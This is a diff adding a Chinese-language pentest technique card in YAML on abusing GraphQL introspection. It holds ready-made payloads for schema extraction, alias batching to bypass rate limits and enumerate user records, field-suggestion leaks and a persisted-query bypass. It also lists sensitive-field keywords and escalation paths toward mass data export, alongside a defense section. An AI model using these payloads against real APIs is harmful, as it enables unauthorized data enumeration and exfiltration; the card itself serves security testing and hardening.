@@ -1,0 +1,117 @@
+# 技术卡片: GraphQL 内省查询滥用
+# 分类: recon / api-discovery
+# 版本: 1.0
+# 日期: 2026-07-25
+# 来源: SecAtlas / PortSwigger / GraphQL Spec
+
+id: "recon-graphql-introspection"
+name: "GraphQL 内省查询滥用"
+category: "recon"
+subcategory: "api-discovery"
+severity: "high"
+
+description: |
+  GraphQL 的内省（Introspection）机制允许客户端查询整个 API schema，
+  包括所有类型、字段、参数、查询和变更操作名。
+  若生产环境未禁内省，攻击者可直接拉取完整 API 结构，
+  发现隐藏查询（如 adminDebug、userExport、internalMetrics）、
+  敏感字段（如 passwordHash、creditCardToken、ssn）及未文档化的变更操作。
+
+  进一步利用：批量查询（Alias Batching）绕过速率限制，
+  在单次请求中通过别名同时发送数十个查询，爆破/枚举敏感数据。
+
+trigger_signals:
+  - "POST /graphql 响应包含 __schema 或 __type"
+  - "GET /graphql?sdl 返回 SDL schema 定义"
+  - "请求 __typename 在任意查询中返回类型名"
+  - "graphiql / playground / voyager 等 IDE 可公开访问"
+  - "GET /graphql 返回 'GraphQL playground' 或 'GET query missing'"
+
+detection:
+  probe:
+    - description: "基础内省探测"
+      payload: |
+        {"query":"{__schema{types{name fields{name type{name kind}}}}}"}
+    - description: "精简探测 — 仅验证内省是否开启"
+      payload: |
+        {"query":"{__schema{queryType{name}}}"}
+    - description: "探测是否开启批量查询（Alias Batching）"
+      payload: |
+        {"query":"{a:__typename b:__typename c:__typename}"}
+      note: "若返回 3 个 __typename 且无错误，支持别名批量"
+
+payloads:
+  full_schema_extraction:
+    - description: "完整 schema 导出"
+      payload: |
+        {"query":"fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}"}
+      note: "GraphQL 标准内省查询，可获取 100% schema 信息"
+
+  sensitive_field_discovery:
+    - description: "搜索敏感字段名"
+      action: "从 introspection 结果中 grep 关键词"
+      keywords:
+        - "password"
+        - "token"
+        - "secret"
+        - "key"
+        - "creditCard"
+        - "ssn"
+        - "admin"
+        - "internal"
+        - "debug"
+        - "export"
+
+  alias_batching:
+    - description: "别名批量绕过速率限制 — 同时查询多个用户"
+      payload: |
+        {"query":"{u1:user(id:1){email role}u2:user(id:2){email role}u3:user(id:3){email role}}"}
+      note: "单次 HTTP 请求完成 3 次独立查询，绕过基于请求数的速率限制"
+    - description: "别名爆破 — 枚举隐藏 ID"
+      note: "对 IDOR 目标使用别名批量化完成 50-100 次枚举"
+
+  field_suggestion_abuse:
+    - description: "利用字段推荐错误信息发现隐藏字段"
+      payload: |
+        {"query":"{user{passwordzzz}}"}
+      note: "GraphQL 错误消息可能返回: 'Did you mean passwordHash?'— 泄露真实字段名"
+
+  persisted_query_bypass:
+    - description: "尝试绕过只允许持久化查询的限制"
+      action: "发送内省查询，若被拒则尝试修改 query hash 为空或任意值"
+      payload: |
+        {"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0000000000000000000000000000000000000000000000000000000000000000"}},"query":"{__schema{types{name}}}"}
+      note: "部分实现未验证 hash 与 query 的对应关系"
+
+success_indicators:
+  - "内省查询返回完整类型树（含字段名、参数、类型）"
+  - "发现文档中未列出的隐藏 query/mutation"
+  - "发现敏感字段（password、token 等）"
+  - "批量别名查询所有返回有效数据，无速率限制错误"
+  - "错误回显泄露了 'Did you mean...' 字段推荐"
+
+prerequisites:
+  - "目标使用 GraphQL 端点（常见路径: /graphql, /api/graphql, /v1/graphql, /gql）"
+  - "生产环境未禁用内省（NODE_ENV=production 但内省仍开启）"
+  - "GraphQL 端点可公开访问（无认证或认证可绕过）"
+
+upgrade_paths:
+  - "用发现的管理 mutation 执行越权操作"
+  - "别名批量 + IDOR → 大规模数据导出"
+  - "schema 中的字段映射到数据库列名 → SQLi 注入点定位"
+  - "mutation 参数分析 → 业务逻辑漏洞挖掘"
+
+defense:
+  - "生产环境禁用内省（apollo-server: introspection: false; graphql-js: 中间件拦截 __schema）"
+  - "基于查询复杂度（query cost analysis）限流，单次别名查询计入 N 倍成本"
+  - "持久化查询白名单 — 仅允许服务端已注册的 query hash"
+  - "字段级访问控制 — 即使 schema 可见，敏感字段需单独授权"
+  - "关闭字段推荐错误 — 不返回 'Did you mean' 错误详情"
+
+sources:
+  - agent: "Claude Code 渗透员"
+    date: "2026-07-25"
+  - ref: "GraphQL Spec §4: Introspection"
+  - ref: "PortSwigger: GraphQL API vulnerabilities"
+  - ref: "HackTricks: GraphQL Attacks"
+  - ref: "CWE-200"
